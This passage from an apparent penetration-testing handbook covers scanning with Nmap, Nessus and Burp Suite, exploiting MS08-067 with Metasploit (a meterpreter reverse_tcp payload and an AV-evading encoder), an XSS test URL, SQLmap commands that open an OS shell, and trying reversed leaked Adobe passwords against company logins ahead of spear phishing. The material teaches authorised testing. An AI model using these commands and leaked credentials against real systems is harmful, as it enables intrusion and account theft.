+I was able to find two groups of researchers who, based on patterns and hints were able to reverse
+some of the encrypted passwords. Remember that from the Adobe list, since the passwords aren’t
+hashes but encrypted passwords, trying to reverse the passwords are much more difficult without the
+key. The two reversed lists I was able to identify are:
+http://stricture-group.com/files/adobe-top100.txt
+
+http://web.mit.edu/zyan/Public/adobe_sanitized_passwords_with_bad_hints.txt
+I combined both these lists, cleaned them, and I host them here:
+https://www.securepla.net/download/foundpw.csv
+Taking this list, what I did was put together a short python script that parses through a list of
+email/encrypted passwords and compares that against the foundpw.csv file. This can be found here:
+https://securepla.net/download/password_check.txt
+Supplying a text file formatted with “email, encrypted password” against the password_ check python
+script, any password matches will cause the script to return a list of email addresses and the reversed
+passwords. Of course, the two research groups don’t have a large number of the passwords reversed,
+but it should contain the low hanging fruit. Let’s see this in action in the next example.
+Figure 7 - Custom Python Script to Look for Email/Passwords
+I will usually take the results from this output and try it against the company’s Outlook Web Access
+(OWA) logins or against VPN logins. 
+You may need to play with some of the variables on the
+passwords (like if they have 2012, you might want to try 2013) and also make sure you don’t lock out
+accounts.
+I then take the email addresses gather from these findings and use them in spear phishing campaigns.
+Remember if they on the Adobe list, there is a great chance that these users are in the IT group.
+Owning one of these accounts could be extremely beneficial.
+
+This is why penetration testing is so much fun. You really can’t just run tools, but you have to use your
+own creativity to give your customer the best and most real type of attack they might receive. So now
+you should have a great list of IP ranges, FQDNs, email addresses, users, and possible passwords.
+Armed with this information, let’s shuffle to active discovery.
+Active discovery is the process of trying to identify systems, services, and potential vulnerabilities.
+We are going to target the network ranges specified in scope and scan them. Whether you are scanning
+from the internal or the external segments of the network, it is important to have the right tools to
+perform active discovery.
+I want to emphasize that this book is not going to discuss in detail how to run a scanner, as you should
+be familiar with that. If you aren’t, then I’d recommend that you download the community edition of
+Nexpose or get a trial version of Nessus. Try running them in a home network or even in a lab
+network to get an idea of types of findings, using authenticated scans, and the type of traffic generated
+on a network. These scanners will trigger IDS/IPS alerts on a network very frequently as they are
+extremely loud. Now that we are ready, let’s get into some of the bigger details here.
+In this section, I describe the process that I like to use to scan a network. I’ll use multiple tools,
+processes, and techniques to try and provide efficient and effective scanning. My scanning processes
+will look something like this:
+Scanning using Nexpose/Nessus
+Scanning with Nmap
+Scanning with Custom Nmap
+Screen Capturing with PeepingTom
+Network Vulnerability Scanning (Nexpose/Nessus)
+As loud as these tools might be, this is the most effective and efficient way to start a test. I like to kick
+
+off one of these (if not both) scanners using safe checks after I make sure I have them configured
+properly. If time is a large concern, I’ll actually run a profile first to look for only known exploitable
+vulnerabilities and a second scan with the default profile. This way, the first scan will complete in a
+fraction of the time and contain only critical findings.
+Let me offer a quick blurb about vulnerability scanners. In the Setup phase I discussed the idea of
+purchasing Nexpose or Nessus scanners. There is always a huge war about which one of the scanners
+is better and I offer this caveat: I have used most of the commercial scanners and have never found
+one to be perfect or the right solution. When comparing these tools, I have found that there are always
+findings that are found and missed by certain tools. The best idea would be to run multiple tools, but
+this isn’t always the most financially acceptable solution.
+My quick two cents is that if you are going to purchase a single license, I would recommend getting
+Tenable’s Nessus Vulnerability Scanner. For the number of IPs you can scan and the cost ($1,500), it
+is the most reasonable. I have found that a single consultant license of Nexpose is double the price
+and limited on the number of IPs you can scan, but I’d ask you to verify, as you never know that prices
+might change.
+Here is a quick example for why you may want to look at multiple tools. The following scan is from
+the professional version of Nexpose against my website. The profile I ran was just a standard
+vulnerability scan without intensive web application checks. The results came back with 4 severe
+findings and take a look at the image below to see the details.
+Figure 8 - Results from Rapid7’s Nexpose Scan
+In the second example, I ran the Tenable Nessus professional scanner with a similar profile and the
+results were much different. Remember that this is only a scan against my webserver and this is a
+
+very small 
+sample. In larger scans, I’ve seen the findings to be much closer that these results. If we
+look at the image below, Nessus came back with 3 Medium findings and 5 Low findings.
+Figure 9 - Results from Tenable Nessus’ Scan
+Just by looking at these two examples, we can identify that they have different results. At a quick
+look, the only finding that I would most likely start to expand on is the Wordpress path leak
+vulnerability identified only by Nexpose and not Nessus.
+Although scanners are very helpful and pretty much a requirement when running network penetration
+tests, you need to understand both their benefits and their limitations.
+Nmap - Banner grabbing
+Before I get into the banner grabbing section, I usually run a customized Nmap OS and service
+detection scan on common ports (or all 65,535 ports if I have enough time). In addition to the regular
+Nmap, I’ll run the banner grabbing script, which I’ll describe below.
+The one problem, which I have with full vulnerability scanners, is that they are extremely time
+consuming. To complement the vulnerability scanner, I run a quick Nmap script to scan ports and to
+grab basic information that will help me organize my attack plan.
+
+My hope is that you have already used Nmap and that you understand exactly what it does. To me
+Nmap is quick, efficient, module based, and does the job. I’d recommend reading Fydor’s Nmap book
+(
+http://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717
+), but the
+focus is to find out quickly all the different hosts and services running. What is most useful to me is to
+run Nmap against all 65535 ports to see if those ports are opened and grab banner information.
+I’ll also use this same process to compare and diff old network scans against new scans to identify
+changes in an environment. Some of my clients ask me to run scans monthly and this is a very quick
+and easy way to identify those changes (a little scripting is required).
+From the Setup Phase, we installed banner-plus.nse from HD Moore. This is the same script he used
+during his mapping of the whole Internet
+3
+. It provides a very quick way to identify the banner page of
+the opened port. The command to run the scan would look something like this:
+nmap —script/usr/share/nmap/scripts/banner-plus.nse –min-rate=400 —min-parallelism=512 -p1-
+65535 -n -Pn -PS -oA/opt/peepingtom/report <IP CIDR>
+Switch List:
+—script = location of the banner-plus script we downloaded in the setup area
+—min-rate = guarantee that a scan will be finished by a certain time
+—min-parallelism = speed up total number of probes
+-p1-65535 = scan all 65k ports
+-n = disable DNS resolution (helps speed scans)
+-Pn = disable ping (a lot of servers will have ping disabled on the external network)
+-PS = TCP SYNPing
+-oA = export all types of reports
+
+You can play around with the -min-rates and min-parallelisms and find the best performance vs.
+reliability for your network (more information can be found at 
+http://nmap.org/book/man-
+performance.html
+). What I have done with this data is to create an easy view to look at services,
+vulnerable versions, and unique issues. The Nmap result will print the output in all different formats
+located in the/opt/peepingtom/folder. We’ll take a look at these files in a second in the Screen
+Capture section, but I wanted to demonstrate how I also use this data.
+In the next section, I wanted to give you an example of how you can take banner data and quickly
+search through all your scan results. I created a MongoDB backend database (for speed purposes) and
+used PHP as the frontend. To push data to the DB, a quick python script was created to parse the
+XML file from Nmap. I then created a PHP page to query this data. Since I was scanning numerous/16
+networks, I needed a quick way to identify unique banner pages that might be of interest to me.
+Ideally, if I have time I’ll have a publicly assessable version of this application where you can
+upload your own xml file and see the results.
+So I built what I now call the internet-scan application. This application can quickly query for certain
+banners, ports and IPs. What is more useful is querying for banner pages of vulnerable systems. You
+might argue that banner pages can lie, but for most of my penetration tests, I have found that it is rare
+to see that. The image below is the initial page of internet-scan.
+Figure 10 - Custom Portal to Parse Nmap Banner Script
+I would then take every banner result and do quick regular expression checks for attacks that I might
+be looking for. I’ll sort the banner results 
+in a couple of different ways. For example, here are the
+interesting banners that I might want to dig deeper into from a/16 scan:
+
+Figure 11 - Script Parsing for Interesting Banners
+Instantly I was able to identify banners that might be systems I want to spend additional time on or
+hosts that might already be compromised. Hm… banner pages with the word scada might be really
+interesting as they could point to electrical grid information… Or what about terminal? Let me tell
+you that those did drop me into non-privileged shells on numerous networking devices.
+I also have pre-created queries for certain types of operating systems, application versions, or other
+information that might quickly allow me to assess a large environment. For example, I made a quick
+regular expression for IIS type banner pages and the results are below.
+Figure 12 - Pulling Out IIS Version Banners
+The speed of just grabbing banners from all 65k ports and the speed of utilizing internet-scan to
+quickly parse through those banners have saved me an immense about of time.
+
+Screen Capture - Peeping Tom
+Getting back to handling our Nmap scan results. As a penetration tester, the problem with scanning
+large ranges is organizing that data and identifying which low hanging fruit you want to attack first.
+You might identify that there are 100+ web sites within a range and to manually visit them becomes
+both time consuming and might not result in any type of vulnerability. Many times, a majority of web
+application pages are pretty useless and could easily be removed from manual review. Peeping Tom
+is a tool that will process an input of IPs and ports, take a screenshot of all HTTP(s) services, and
+present it in an easy to read format.
+This means you’ll be able to pull up an HTML page and quickly view which sites have a higher
+probability of containing a vulnerability or pages that you know you want to spend more time on.
+Remember that 
+during a test it is often it is all about time as your testing windows can be pretty small.
+Before we can kick off Peeping Tom, we need to prep and clean the data for scraping. Gnmap.pl is a
+little Perl script that will take the results from the prior Nmap and clean it to a list of IPs.
+4
+ We can do
+this by the following commands.
+cd/opt/peepingtom/
+cat report.gnmap | ./gnmap.pl | grep http | cut -f 1,2 -d “,”| tr “,” “:” > http_ips.txt
+The output will be a file called http_ips.txt with a full list of IPs running http services. We can now
+feed that into Peeping Tom to start screen grabbing. To run Peeping Tom:
+python ./peepingtom.py -p -i http_ips.txt
+The example below demonstrates running the tool against an output from our previous Nmap scan.
+Note that some http services can’t be captured and will have to be visited manually.
+python ./peepingtom.py -h
+Usage: peepingtom.py [options]
+peepingtom.py - Tim Tomes (@LaNMaSteR53) (
+www.lanmaster53.com
+)
+Options:
+—version show program’s version number and exit
+-h, —help show this help message and exit
+-v Enable verbose mode.
+
+-i INFILE File input mode. Name of input file. [IP: PORT]
+-u URL Single URL input mode. URL as a string.
+-q PyQt4 capture mode. PyQt4 python modules required.
+-p Phantonjs capture mode. Phantomjs required.
+python ./peepingtom.py -p -i http_ips.txt
+[*] Storing data in ‘131229_230336/’
+[*] http://192.168.58.20 200. Good.
+[*] https://192.168.58.20 200. Good.
+[*] http://192.168.58.21 403. Good.
+[*] https://192.168.58.21 <Connection refused>. Visit manually from report.
+[*] http://192.168.58.25 <No route to host>. Visit manually from report.
+[*] https://192.168.58.25 <No route to host>. Visit manually from report
+[*] http://192.168.58.35 <Connection refused>. Visit manually from report.
+[*] http://192.168.58.48 200. Good.
+[*] https://192.168.58.48 200. Good.
+Once Peeping Tom is finished running, a new folder will be created and named based on a date
+timestamp in the peepingtom folder. Inside this folder will be all the images and a report.html file.
+Opening the report.html file with a browser, you will be able to quickly identify which pages are
+more useful and which pages do not render. Let’s take a quick look at the results from our scan.
+
+Figure 13 - Peeping Tom Output
+Inside the report, we notice a lot of different screen shots. It will display the snapshot of the webpage
+with information about the server, date, and HTTP responses. Image if you had a test will 100+
+webservers. This will make your life so much easier to be able to parse through all the websites in a
+few minutes.
+So what are you really looking for? Well this is where experience really pays off as there isn’t a right
+answer, but here’s what usually stands out to me:
+Apache Tomcat
+JBoss
+ColdFusion
+WordPress
+
+Joomla
+Beta/DEV Sites
+Pages that require authentication
+Default Networking Device Pages
+Content Management Systems
+Wikis
+Pages with Copyright messages < 2012
+VOIP page
+The reason I go after these sites is because they usually result in compromised systems or access to
+data. There are also a lot of known vulnerabilities for Apache, JBoss, and Cold Fusion where exploit
+code is readily available.
+Some examples:
+Cold Fusion Example: 
+http://www.exploit-db.com/exploits/25305/
+JBoss Example: 
+http://www.rapid7.com/db/modules/exploit/multi/http/jboss_maindeployer
+Apache Example: 
+http://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_deploy
+One additional reason I look for sites that require authentication is because they generally tell me that
+the application has additional functionality and has a better chance of revealing web application
+issues or default passwords.
+This should give you a great start into quickly identifying vulnerabilities and getting a grasp of the
+network you are testing. This isn’t a comprehensive guide to network scanning, but what I have found
+to make for more efficient and faster scanning.
+
+After I start the network scanners and get a layout with Peeping Tom, I move directly to starting my
+web application scanners. In web scanning, I am going to focus on mainly one tool. There are a lot of
+open source/free tools to use, such as ZAP, WebScarab, Nikto, w3af, etc. that are all good, but again
+I am going for the quickest, most efficient way to perform a test. Although the Burp Suite Pro
+(
+http://portswigger.net/burp/
+) is a paid tool, it only costs around $300. This is well worth the cost as
+it is actively maintained, many security researchers develop extensions for Burp, and it has a lot of
+capabilities for manual testing.
+Similar to the discussion of vulnerability scanners, this isn’t going to be a comprehensive guide to
+accomplishing web application penetration tests, but more of what is performed during a network
+penetration test. If you want to focus on testing a single application thoroughly, you’re going to want
+to look into both source code analysis (using something like HP Fortify) and in-depth application
+testing (a great resource for this is a book called 
+The Web Application Hacker’s Handbook: Finding
+and Exploiting Security Flaws
+). Let’s dive in how to efficiently use Burp Suite.
+In this section I describe how I use Burp Suite Pro to scan web applications during a network
+penetration test. Usually, I won’t have enough time during a network pen-test to do a full web
+application test, but these are the steps I take when I identify larger applications.
+ Spider/Discovery/Scanning with Burp Pro
+Scanning with a web application scanner
+Manual parameter injection
+Session token analysis
+After running a tool like Nessus or Nexpose to find the common system/application/service
+vulnerabilities, it’s time to dig into the application. I’m going describe how to use Burp Suite and get
+you to start looking deeper into the application. The following steps are going to do this:
+1) Configure Your Network Proxy
+
+2) Enable Burp Suite
+3) Spider through the application
+4) Discover Content
+5) Run the Active Scanner
+6) Exploit
+Configuring Your Network Proxy and Browser
+Remember that how the Burp Suite tool works is to configure your web browser to talk through the
+Burp Suite and then to the web application(s). This will give you full visibility in the requests made
+by 
+the browser and also give you the ability to modify the raw requests regardless of client side
+protections.
+First, you are going to want to start Burp Suite by running the JAR file on either the Windows or Kali
+system. Once you have Burp up and running, you want to make sure your proxy is enabled and
+listening on port 8080. Go to the Proxy tab in Burp, to Options, and make sure that Burp is running. It
+doesn’t matter which interface port you use, but that if you change it from the default, make sure to
+change it in your browser’s configuration.
+
+
+Figure 14 - Enabling Burp Suite
+Now, we need to configure your browser so that it can use the port that we had Burp Proxy listening
+on. The add-on that I use is called Foxy Proxy for Firefox (
+https://addons.mozilla.org/en-
+US/firefox/addon/foxyproxy-standard/
+) and it should have been installed in the setup phase. It’s an
+easy way to have multiple proxies and to be able to change between them quickly. Right next to the
+browser’s URL bar, there is a fox with a circle and line across it. Click on the fox, click “Add New
+Proxy”, click Proxy Details tab, and you’ll need to set the Manual Proxy Configuration to the local
+host (127.0.0.1) and the proxy port of 8080. Go back to the General tab, give that proxy a name, and
+save that configuration.
+What you’ve essentially done is told your browser to send all the traffic to your local host to port
+8080. This is the port we’ve configured the Burp Suite application to listen on. Burp knows that it
+will take this traffic and proxying it out to the Internet.
+Figure 15 - Configuring the Brower’s Proxy Settings
+Since you’ve saved this profile, right click on the fox and drop down and select your proxy
+configuration. In this case, I named my proxy configuration Burp Suite and selected that as my proxy.
+Figure 16 - Selecting the Proxy to Utilize
+Once we have our browser using the proxy, we can browse to the web application we identified
+earlier. In this example, in my browser I am going to go to my site: 
+www.securepla.net
+. If we go back
+
+to Burp, we are going to see the Proxy/Intercept tab light up.
+Figure 17 - Burp Capture and Intercepting Traffic
+If you see this happen, we know we’ve configured everything perfectly. We now see that Burp
+successfully captured the GET request for my website. We can also see any cookies and other request
+information. By default, the initial state is to intercept all traffic. Intercept means to stop any requests
+from the browser to the web application, give you the ability to read or modify that request, and either
+forward that request to the web application or drop that request.
+If you try to browse to any sites with the default setting, you won’t be able to see any responses until
+you turn off the “Intercept” button. By 
+clicking the “Intercept” button off, we will still be capturing all
+the web traffic, but we won’t be directly tampering with every request. Once in an intercept off state,
+you can see all the requests and responses within the History tab to the right of the Intercept.
+Now, if we go to the Target tab, we can see the URL that we had just trapped and forwarded. Let’s
+first add this site to our Scope. Scope defines where automated spidering and testing could occur and
+helps you to not actively scan domains that are out of your scope. We’ll go into this a little bit later,
+but you should add all the URLs or FQDNs you want to test to your scope. The image below shows
+the tester right clicking on the domain and clicking on “Add to scope”.
+
+
+Figure 18 - Creating Your Scope
+Spider Application
+The first thing to do for web application testing is to spider the host. This means that Burp will crawl
+through the whole website and record 
+all the different files, forms, and HTTP methods on that site.
+We spider first because we need to identify where all the links are, what types of parameters are used
+in the application, what external sites the application references to, and the overall layout of how the
+application functions.
+To spider your application, drop into the Target tab, Site map tab, right click on the domain you want
+to spider, and click “Spider this host”.
+Figure 19 - Spidering the Host
+Once the spidering process is complete, Burp should have a good layout of exactly what the
+application looks like. We can also click on any file (image below) to see what the request was and
+what the response was. In the left hand column we see all of the files and folders and on the right hand
+side we see the requests and responses. Right below the Site map tab is the Filter button. Try playing
+around with this to see what you are filtering out and what works for you. Generally, I like to first add
+all my domains to scope and then click the Filter to only show those that are in scope. It ends up
+cleaning up a lot of referenced domains which are out of scope on my tests anyway.
+
+Figure 20 - Site Map/Request and Responses
+Discover Content
+There are times where pages or folders are not directly linked from a web application. For example,
+often I’ve seen that the admin folder or login page are not referenced anywhere on the site. You might
+see that in your browser bar you go to the/admin/folder and you are taken to the admin authentication
+page, but this might have been missed during the spidering phase. This is usually because host
+administrators are trying to hide these folders and administrative login pages from general users.
+These are the exact types of things you are looking for in a test, so that you can try to bypass or brute
+force the authentication process.
+There is a specific module within Burp that is extremely helpful in these scenarios. Within the same
+Site map tab, you right click on the parent URL, drop down to the “Engagement tools”, and click on
+“Discover content”.
+
+Figure 21 - Discovering Content
+Once inside the Discovery module, you can click on the “Session is not running” button and the
+application will start “smart brute forcing” folders and file structures. When I say “smart brute
+forcing,” I mean the application learns from files and folders it finds within the application and tries
+to make better choices for brute forcing. This technique provides an efficient process to identify
+folders and files to further your application testing.
+Before I show the example, note that there are custom wordlists that I prefer to use during my own
+assessments. I’m not sure if RAFT is still being actively developed, but a few years back a couple
+guys did a talk about developing better lists of the most common folders and files. They have many
+different lists that you should look at based on your scope and testing windows. These lists can be
+found here: 
+http://code.google.com/p/raft/source/browse/trunk/data/wordlists/?r=64
+.
+
+Figure 22 - Discovering Session Status
+As you can see in the image above, the Discovery tool identified the/wp-includes/folder which is
+common to WordPress applications. It then starts looking for common folder/files types within that
+folder. You can click on the site map tab at the top of the Discovery module and see all the results
+from that scan. This will help quickly identify hidden folders, admin pages, configuration pages, and
+other pages that will prove useful to a tester.
+Running the Active Scanner
+Once you feel comfortable that you have identified an adequate portion of the site, you can start
+attacking the parameters, requests, and looking for vulnerabilities. This can be done by right clicking
+on the 
+parent domain and dropping down to “Actively scan this host” (image below). This will kick
+off Burp’s application scanner and start fuzzing input parameters. Remember, this is going to be
+extremely loud on the network and may submit extensive queries in the application. A quick warning,
+if the application has a comment box, the customer might receive an excessive amount of emails from
+all the parameters being actively fuzzed. This is always why it is important to let your customer know
+when and from where the tester will be performing these tasks.
+
+Figure 23 - Active Vulnerability Scans
+Once the scanner is running, the results and testing queue will be located in the “Scanner” tab. You
+might want to look at the Options tab within the Scanner tab to further configure Burp Suite. One
+change that I generally make to decrease scans times is to increase the number of threads in the Active
+Scan Engine section. This will make a significant difference in the amount of time that is required, but
+be careful as you might take down a small site if the thread count is too high.
+If we take a look at the results, we see that Burp Suite found an XSS vulnerability for this website.
+Burp told us exactly what the issue was, the request to repeat it, and the response.
+Figure 24 - Scan Results
+Being a penetration tester, you need to verify that you do not have any false positives and to identify
+the actual severity of the finding. Let’s see if what Burp had found was actually valid. Clicking on one
+
+of the XSS vulnerabilities, we can see the exact GET parameter that was used. To replicate this
+issue, we would have to go and visit:
+www.securepla.net/xss_example/example.php?alert=9228a<script>alert(1)</script>281717daa8d
+.
+Opening a browser and entering the URL, the following demonstrates that this is not a false positive,
+but a real vulnerability. If you aren’t familiar with XSS attacks, I’d spend some time playing with a
+vulnerable web application framework like WebGoat:
+https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project
+.
+Figure 25 - XSS Example
+Burp will do a lot more than just check for XSS vulnerabilities. It can identify CSRF issues, bad SSL
+certs, directory traversal vulnerabilities, SQL injections, command injections, and much more. To see
+more uses of Burp, go to the section in this book about 
+Web Application Pentesting
+.
+Scanning the network is an important step for a successful network-wide penetration test. With such a
+large scope, both passive and active scanning can provide information about the network, services,
+applications, vulnerabilities, and hosts. Using specialized or customized port scans, web scraping,
+“smart brute forcing,” and automated tools can help increase the efficiency and the effectiveness of
+the test. These findings will directly lead into the next few sections of exploiting vulnerabilities
+identified by this process.
+
+The concept of the drive is that you see the open hole or vulnerability and it’s up to you break
+through. There are many different types of vulnerabilities identified from a scanner, but I’ll go over
+two of the standard ways to exploit common vulnerabilities. This section is going to be more of a high
+level view, because if I were to focus on every type of vulnerability this book would become
+extremely long. This book is also assuming you have some experience with exploitation and this
+should hopefully just be a refresher.
+Whether you use Nexpose or Nessus (or any other vulnerability scanner), it might not make a
+difference on the exploiting process. Once a scanner finds a vulnerability, I will usually go search for
+a working exploit. I have dedicated a section in the later chapters about 
+Vulnerability Searching
+ and
+how to find exploits based on findings from a scanner, but for now I will briefly describe how to use
+Metasploit and the importance of understanding scripts to exploit your vulnerabilities.
+(
+http://www.metasploit.com
+) (Windows/Kali Linux)
+The most common exploiting tool we’ve all used is Metasploit. The Metasploit Framework is
+designed for developing, exploiting, and assisting in attacks. The best part of the framework is that it
+was 
+developed with research in mind. By this I mean that it is very easy to develop your own
+Metasploit modules and utilize them within the framework. 
+5
+ It doesn’t take a lot of Ruby knowledge,
+but more basic scripting skills. Without spending too much time explaining Metasploit, let’s walk
+through an example using the framework.
+Pick an exploit or module to use
+Set your options for the module
+o
+The ‘set’ command is used to input values into the configuration of the module
+o
+Set the victim hosts and ports
+
+o
+Set your local hosts and ports
+o
+Possibly set system versions, user accounts, and other information
+o
+Issue the ‘show options’ command to see what options are required or needed
+Configuring payloads
+o
+Payloads are what should happen after the vulnerability is exploited
+o
+To get a better understanding of the types of payloads review: 
+http://www.offensive-
+security.com/metasploit-unleashed/Payload_Types
+o Issue the ‘show payloads’ command to see all the different types
+o
+Use the ‘set payloads’ to configure which payload to use
+Set Encoders
+o
+This is the basic way to obfuscate the attack in Metasploit. Sadly, this still often triggers on
+AV and is not reliable for penetration testing. We’ll discuss later in the book better ways on
+how to evade AV.
+o
+To see payloads, issue the ‘show encoders’ command and apply them via the ‘set encoders’
+command
+Setting additional options
+Running the selected and configured attack issuing the ‘exploit’ command
+Since I usually use the CLI version of Metasploit, it’s hard to remember all the different types of
+commands. Here is a quick Cheat Sheet to help out: 
+http://www.cheatography.com/huntereight/cheat-
+sheets/metasploit-4-5-0-dev-15713/
+. Of course you can always type “help” within the application for
+additional help.
+
+I know that the MS08-067 vulnerability is extremely old, but not only do I still find these
+vulnerabilities every so often, the attack is extremely stable compared to other remote attacks. For
+those that have never used tried the MS08-067 vulnerability, I’d highly recommend setting up a lab
+with an old unpatched Windows XP system and trying this 
+exact example. If you’re an expert MS08-
+067’er, you can skip the short section.
+Dropping into Metasploit on Kali
+o
+Open up a terminal and type: msfconsole
+To search for a vulnerability, type:
+o
+search ms08-067
+Figure 26 - MS08-067 Metasploit Example
+To exploit the system via the MS08-067 vulnerability:
+Select the exploit from the search results, type:
+o
+use exploit/windows/smb/ms08_067_netapi
+See options required for the exploit to work, type:
+
+o
+show options
+Set IP information,
+ type:
+o
+set RHOST [IP of vulnerable Windows host]
+o
+set LHOST [IP of your machine]
+Select which payloads and encoder to use, type
+o
+set PAYLOAD windows/meterpreter/reverse_tcp
+o
+set ENCODER x86/shikata_ga_nai
+Run the attack, type:
+o
+exploit
+Figure 27 - MS08-067 Example
+In the 
+Evading AV
+ section, I’ll show you how to create Meterpreter reverse TCP payloads that will
+get around AV detection. No more using Shikata ga nai and hoping that AV won’t pick up the payload.
+
+
+There are a countless number of times where I have found exploits for vulnerabilities that weren’t in
+Metasploit. Usually searching for vulnerabilities based on version numbers from the 
+banner grabbing
+script
+, I’ll find exploits in other places (
+Finding Exploits Section
+). A lot of the time, the scripts/code
+will be written in Python, C++, Ruby, Perl, Bash, or some other type of scripting language.
+As a penetration tester, you need to be familiar with how to edit, modify, execute, and understand
+regardless of the language and be able to understand why an exploit works. I don’t recommend you
+ever execute a script without testing it first. I have honestly seen a few scripts on forums and Exploit-
+DB where the shell code payload actually causes harm to the intended system. After the script
+exploits the vulnerability the payload deletes everything on the vulnerable host. I’m pretty sure that
+your client would not be too happy if everything on his host system was wiped clean. That is why
+either you should always use your own shell code or validate the shell code that is within the script.
+Let’s say you find a vulnerable version of WarFTP server running and you find some code (for
+example: 
+http://downloads.securityfocus.com/vulnerabilities/exploits/22944.py
+) on the internet.
+Things you may need to understand:
+How do you run the exploit? What language is it? Do you need to compile it or are there any
+libraries you need to import?
+Are there any dependencies required for the exploit to work? Version of Windows or Linux? DEP
+or ASLR?
+ Are the EIP addresses or any other registers or padding values hardcoded to specific versions?
+Do they need to be modified?
+Will the exploit take down the service? Do you only have one chance at compromising the host?
+This is very important as you might need to work with the client or test a similar infrastructure
+environment.
+Here is an example of what your script could look like and, if run properly, could allow shell access
+on the victim server.
+
+Figure 28 - Example Exploit
+Even with MS08-067, the exploit is Operating System and service pack dependent. Luckily with that
+payload, it tries to identify the proper OS before exploiting the host. A lot of the exploits written in
+scripting 
+languages do not take these into account and are developed for a single OS type. This is why
+you’ll often see that the exploit will contain information about the system it was tested on. Even
+within the same Operating System, something like the Language of the OS can cause an exploit to fail
+or cause a denial of service. For example, the following PCMAN FTP buffer overflow exploit was
+only tested on the French version of Windows 7 SP1. This does not guarantee that this exploit will be
+successful on the English version.
+
+Figure 29 - FTP Exploit Example Script
+6
+That’s why I highly recommend you understand and test all of your exploits before you try them on
+any production host and make modifications to scripts as necessary.
+This is a baseline overview on taking the findings from the scanner results and putting them into
+action. These examples will help lead into how to exploit systems in the upcoming chapters. Attacks
+and exploits might not always work and this is why I stress that my students not be tool dependent. It
+is more important to understand why an attack works and what the underlying issue is, so that if a tool
+fails to work, you have the ability to modify and fix that exploit.
+What helped me learn how to exploit computers was to take exploits from sites like
+http://www.exploit-db.com/remote/
+ and recreate them in another high level scripting language of my
+choice. Developing these types of scripts and testing them against your own servers will help you
+gain a much stronger background in coding and a better understanding why vulnerabilities work. If
+you are looking to dive deep into exploit development, I’d highly recommend reading The
+Shellcoder’s Handbook: 
+http://amzn.to/19ZlgfE
+.
+
+At this point, you’ve assessed your targets, setup the plays, and now it’s time to exploit the web
+vulnerabilities. This portion of the book will dive into how to take these findings from your web
+application scans and manual testing to system compromise.
+The topics that covered for the web application testing section will be: SQL injection (SQLi), cross-
+site scripting (XSS), cross-site request forgery (CSRF), session token entropy, fuzzing/input
+validation, and business logic. Although these aren’t all of the different types of tests to validate,
+these generally provide the major findings that lead to a compromised user base, application, or
+system. This will also give you a good baseline for learning other types of web-based attacks.
+For a more in-depth application specific testing framework, versus a network style test, you should
+become very familiar with OWASP’s testing guide: 
+http://bit.ly/19GkG5R
+ and The Web Application
+Hacker’s Handbook: 
+http://amzn.to/1lxZaCv
+.
+From either the scanning results or from just poking around, you might be able to identify some SQL
+injections (SQLi) vulnerabilities. This is great because SQLi vulnerabilities can lead to a full
+compromise of the database or of the system itself. Two open source tools that I have found to work
+most of the time are SQLmap and Sqlninja. Let’s go through the process from identification to
+exploitation.
+If you come across an SQL Injection finding in Burp Suite from the previous web application
+scanning section, it would look something like this in the scanner results tab (
+Figure 30
+).
+
+Figure 30 - Burp SQL Injection Finding
+One great benefit of using Burp is that it gives you a confidence rating of whether the findings are
+valid or potential false positives. In this case (
+Figure 30
+), Burp’s confidence is “Certain” and the
+vulnerable parameters are the Password, Username, and User-Agent fields.
+SQLmap (
+http://sqlmap.org/
+) (Kali Linux)
+SQLmap is one of my favorite tools to use for finding SQL injections, manipulate database queries,
+and dump databases. It also has additional functionality to get an interactive shell through an injection
+and can even spawn Meterpreter or a VNC session back to the attacker.
+In the following examples, I’ll show both a GET parameter and a POST parameter example with
+SQLmap, since they are the most commonly identified types of SQLi. The reason I show both HTTP
+method attacks is that if you don’t have the request properly configured, it is very likely the attack
+will fail.
+Here is a look at the help file for SQLmap, as there are a lot of different switches that can be used for
+SQLi attacks: sqlmap -h
+
+Figure 31 - SQLMap Help Information
+GET Parameter Example
+In the following examples, we are going to assume that the GET parameter is where the SQLi
+vulnerability is located with the URL. 
+We want to test every parameter and make sure that we are
+sure that the SQLi vulnerability is really a finding. There are a good number of false positives I’ve
+seen with scanner tools, so validation is really the only method of ensuring the findings. Remember
+that if you do not specific a value to test, SQLmap will test every parameter by default.
+Finding if an SQL inject is valid (the result will be the banner if valid):
+sqlmap -u “
+http://site.com/info.php?user=test&pass=test
+” -b
+Retrieving the database username:
+sqlmap -u “
+http://site.com/info.php?user=test&pass=test
+”—current-user
+Interactive Shell
+sqlmap -u “
+http://site.com/info.php?user=test&pass=test
+”—os-shell
+Some hints and tricks:
+You might need to define which type of database to attack. If you think an injection is possible but
+SQLmap is not finding the issue, try to set the —dbms=[database type] flag.
+
+If you need to test an authenticated SQL injection finding, log into the website via a browser and
+grab the Cookie (you can grab it straight from Burp Suite). Then define the cookie using the —
+data=[COOKIE] switch.
+Stuck? Try the command: sqlmap —wizard
+POST Parameter Example
+POST examples are going to mimic GET injections, except for how the vulnerable parameter is
+passed. Instead of being in the URL, the POST parameters are passed in the data section. This is
+normally seen with username and passwords as the web servers generally log GET parameters and
+you wouldn’t want the webserver to log passwords. Also, there are size limitations with GET
+methods and therefore a lot of data will be passed via POST parameters for larger applications.
+Finding if an SQL inject is valid (the result will be the banner if valid):
+sqlmap -u “
+http://site.com/info.php
+ “ —data= “user=test&pass=test” —b
+Retrieving the database username:
+sqlmap -u “
+http://site.com/info.php
+ —data= “user=test&pass=test” —current-user
+Interactive Shell
+sqlmap u “
+http://site.com/info.php
+ —data= “user=test&pass=test”—os-shell
+If you are able to gain access to an os-shell, you’ll have full command line access as the database
+user. In the following example, I was able to find a vulnerable SQLi, gain an os-shell, and run an
+ipconfig command.
+
+Figure 32 - SQLMap Command Shell
+I would spend some time getting used to running different SQLi commands and trying different
+switches identified in the help file. If SQLmap fails, it might be your configuration, so make sure to
+try using the Wizard setup, too.
+Sqlninja (
+http://sqlninja.sourceforge.net/
+) (Kali Linux)
+Sqlninja is another great SQL injection tool for uploading shells and evading network IDS systems.
+You might be asking why would I use Sqlninja if I’ve already become comfortable with SQLmap?
+From many years of experience, I’ve seen a large number of tests that identify SQLi with only one
+tool or the other. This might because how it detects blind SQLi, how they upload binaries, IPS
+signatures that might detect one tool or the other, or how they handle cookies. There 
+are so many
+different variables and it’s smart to always double check your work.
+Taking a look at the help file with the -h switch, we can see all the different functionality Sqlninja
+has.
+
